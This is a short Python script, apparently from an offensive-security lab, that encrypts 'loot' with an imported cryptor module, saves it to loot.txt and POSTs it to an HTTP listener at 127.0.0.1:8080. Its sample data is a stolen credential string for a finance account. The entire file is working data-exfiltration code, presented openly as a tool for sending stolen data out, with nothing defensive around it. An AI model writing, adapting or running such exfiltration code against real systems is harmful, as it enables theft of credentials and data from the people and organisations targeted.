#This script will take your loot, encrypt it using your working cryptor.py, and "post" it to your listener.

import requests
from cryptor import encrypt


def exfiltrate_http(data):
    url = "http://127.0.0.1:8080/data_sync"
    print("[*] Scrambling data for transport...")
    encrypted_payload_bytes = encrypt(data)
    payload_string = encrypted_payload_bytes.decode().replace('\n', '').replace('\r', '')

    with open("loot.txt", "w") as f:
        f.write(payload_string)

    print(f"\n---START---\n{payload_string}\n---END---")
    print("[*] Success: Perfect payload saved to 'loot.txt'")

    try:
        response = requests.post(url, data=payload_string)
        if response.status_code == 200:
            print("[+] Data exfiltrated over HTTP successfully!")
    except Exception as e:
        print(f"[!] Transmission failed: {e}")


if __name__ == '__main__':
    stolen_loot = b"CREDENTIALS: user=finance_mgr pass=Winter2026!"
    exfiltrate_http(stolen_loot)

